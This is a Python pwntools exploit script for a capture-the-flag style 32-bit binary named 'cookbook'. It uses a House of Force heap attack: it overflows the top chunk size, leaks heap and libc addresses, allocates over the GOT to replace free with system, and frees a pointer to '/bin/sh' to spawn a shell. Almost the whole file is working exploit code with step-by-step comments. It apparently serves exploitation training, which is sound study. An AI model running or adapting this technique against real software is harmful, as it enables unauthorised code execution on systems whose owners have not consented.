from pwn import *
import time

import sys
sys.path.append('../../')
import pwnutil as util

#context.terminal = ['tmux', 'splitw', '-h']
# Connect to remote machine
#r = remote("training.jinblack.it", 2017)

r = process("./cookbook", env={'LD_PRELOAD': '../../libc-2.27.so'})

''' not attaching to remote  

# menu call        b *0x804a421 
# before top leak	b *0x8048dd3
# before big malloc	b *0x8048b81 
# after big malloc	b *0x8048bf3
# before recipe info	b *0x8049485
# after recipe info	b *0x80494c0		
# b *0x8048bbc

gdb.attach(r, """
	c
	""")
'''
#context.log_level = "debug"


'''
EXPLANATION
32 bits, Canary, NX

Important note: malloc is 16 aligned

- leak top_chunk by deleting ingredients and malloc-ing a new one so that is reuses the bin
- overflow into top_chunk via recipe info and set size to max
- discard bins so that everything is malloc-ed from top_chunk
- big malloc until got
- malloc ingredient over got and print it to leak it, we can calculate everything from libc now
- overflow into top_chunk again, same way
- big malloc until got
- malloc cookbook name over got and overwrite free with system
- malloc until current recipe ptr in bss
- overwrite current recipe ptr with libc@binsh
- free current recipe so system(binsh) executes
'''

input("wait")

preloaded_ingredients = ["water", "tomato", "basil", "garlic", "onion", "lemon", "corn", "olive oil"]

def delete_ingredient(name):
	r.sendline(b"e")
	r.sendline(name)
	time.sleep(0.01)
	r.clean()

r.sendline(b"cookedname")

input("wait, proceed to overwrite top chunk size")

# overflow into top_chunk and overwrite its size
r.sendline(b"c") # recipe menu
r.sendline(b"n") # new recipe
r.sendline(b"i") # change recipe info (gets more bytes than space than available, so overflow)
r.sendline(b"\xff" * 0x40c) # * 900) # overflow into top_chunk size
r.sendline(b"q") #quit recipes menu
time.sleep(0.01)
r.clean()

input("wait, proceed to leak top chunk")

# delete ingredients so their chunks go into bins
delete_ingredient(preloaded_ingredients[-1])
delete_ingredient(preloaded_ingredients[-2])

# leak heap by allocating a new ingredient that uses a freed bin
r.sendline(b"a") # ingredients menu
r.sendline(b"n") # new ingredient (malloc), will use a previously deleted ingredient chunk
r.clean()
r.sendline(b"l") # print info, heap info wasn't deleted so we will print it
r.recvuntil(b"calories: ") # leak is in calories slot
leaked_heap_address = int(r.recvuntil(b"\n")[0:-1])

r.sendline(b"q") # exit ingredient menu

time.sleep(0.01)
r.clean()

# calculate top chunk from the leaked address
print("Leaked heap address: 0x%08x" % leaked_heap_address)
offset_to_top_chunk = 4680 # got this by comparing with top_chunk in gdb
top_chunk = leaked_heap_address + offset_to_top_chunk
print("top_chunk: 0x%08x" % top_chunk)

input("wait, proceed to big size malloc until got")

# big size malloc so that next malloc is over .got.plt

# calculate size to reach .got.plt
got = 0x804d000
big_size = (got - top_chunk - 150) & 0xffffffff # - 150 so new malloc lands where we need (0x804d010)
print("big_size: 0x%08x" % big_size)

# allocate big chunk by creating a new cookbook name
r.sendline(b"g") # new cookbook name
r.sendline(b"0x%08x" % big_size) # size of the name in hex
r.sendline(b"ABCDE") # irrelevant name

time.sleep(0.01)
r.clean()

input("wait, proceed to leak got")

# we can use the new cookbook name to allocate any size, so we can delete bins with this
def discardbin(size):
	r.sendline(b"g") # new cookbook name
	r.sendline(b"0x%08x" % size) # size of the name in hex
	r.sendline(b"disc") # irrelevant name

# discard bins so that next ingredient alloc is from top_chunk
discardbin(0x408) # bin is size 411, taking account for the padding: 408
discardbin(0x376) # bin is size 381
discardbin(0x90) # bin is size 381

# allocate ingredient over .got.plt so we can leak it when printing the ingredient info
r.sendline(b"a") # ingredient menu
r.sendline(b"n") # new ingredient
time.sleep(0.01)
r.clean()
r.sendline(b"l") # print ingredient info
time.sleep(0.01)
# it prints name, calories and price
r.recvuntil(b"name: ")
free_leak = r.recvuntil(b"\n")[0:-1]
r.recvuntil(b"calories: ")
printf_leak = int(r.recvuntil(b"\n")[0:-1]) & 0xffffffff
r.recvuntil(b"price: ")
strcspn_leak = int(r.recvuntil(b"\n")[0:-1]) & 0xffffffff

# print leaks
print(b"strcspn leak: 0x%08x" % strcspn_leak)
print(b"printf leak: 0x%08x" % printf_leak)
free_leak_string = ""
for i in range(0,len(free_leak),4):
	free_leak_string += " " + hex(unpack(free_leak[i:i+4], 'all', endian='little', sign=False))
print("free leak:" + free_leak_string)

overwrite_free_prefix = p32(printf_leak) + p32(strcspn_leak) # not really needed but just do we dont overwrite printf and strcspn in got
print(b"free prefix: " + overwrite_free_prefix)

r.sendline(b"q") # quit ingredients menu
time.sleep(0.01)
r.clean()

libc_system = printf_leak - 0x140d0 # offset calculated from gdb
libc_binsh = printf_leak + 0x12cdff
print("libc@system 0x%04x" % libc_system)
print("libc@binsh 0x%04x" % libc_binsh)

input("wait, proceed to overwrite top_chunk size")

'''
We leaked libc, now we need to do a roundtrip until got again
we could overwrite free by writing the ingredient's name
but writing ingredients would overwrite the entire got
so instead, we will alloc a new cookbook name and write only what we need
'''

# overflow into top_chunk and overwrite its size again
r.sendline(b"c") # recipe menu
r.sendline(b"n") # new recipe
r.sendline(b"i") # change recipe info (gets more bytes than space than available, so overflow)
r.sendline(b"\xff" * 0x40c) # * 900) # overflow into top_chunk size
r.sendline(b"q") #quit recipes menu

time.sleep(0.01)
r.clean()

input("wait, proceed to big allocation until got plt")

top_chunk = 0x804d4b8 # predictable now, no need to leak it and mess with frees
got = 0x804d000 # 0x804d050 bss

# top_chunk at this point is 0x804d4b8
# we want to get to got again 0x804d000
# so with that, we can just calculate big_size
# its weird because of the 16 aligned malloc
big_size = 0xfffffb40 
print("big_size: 0x%08x" % big_size)

# allocate big chunk by new cookbook name so that next malloc is over got
r.sendline(b"g") # new cookbook name
r.sendline(b"0x%08x" % big_size) # size of the name in hex
r.sendline(b"s") # irrelevant name

time.sleep(0.01)
r.clean()

input("wait, proceed to allocate over got and overwrite free with system")

# allocate over got and overwrite free with system
r.sendline(b"g") # new cookbook name
r.sendline(b"0x%08x" % 64) # size of the name in hex (should be in hex, it works so whatever)
r.sendline(overwrite_free_prefix + p32(libc_system)) # overwrite free with system

time.sleep(0.01)
r.clean()

input("wait, proceed to allocate over current recipe ptr and overwrite with binsh ptr")

# allocate a chunk from current top_chunk so that next malloc is at current recipe ptr
r.sendline(b"g") # new cookbook name
r.sendline(b"0x%08x" % 0x32) # size of the name in hex
r.sendline(b"") # nothing here

# allocate at current recipe ptr and overwrite it with binsh
r.sendline(b"g") # new cookbook name
r.sendline(b"0x%08x" % 0x32) # size of the name in hex, we need only 4 bytes but bigger to make sure no bin is reused
r.sendline(p32(libc_binsh)) # overwrite current recipe ptr with binsh ptr

time.sleep(0.01)
r.clean()

input("wait, proceed to execute system(libc)")

# now we just need to free the current recipe
r.sendline(b"c") # recipe menu
r.sendline(b"d") # free recipe (execute system(libc_binsh))

time.sleep(0.01)
r.clean()

r.interactive()

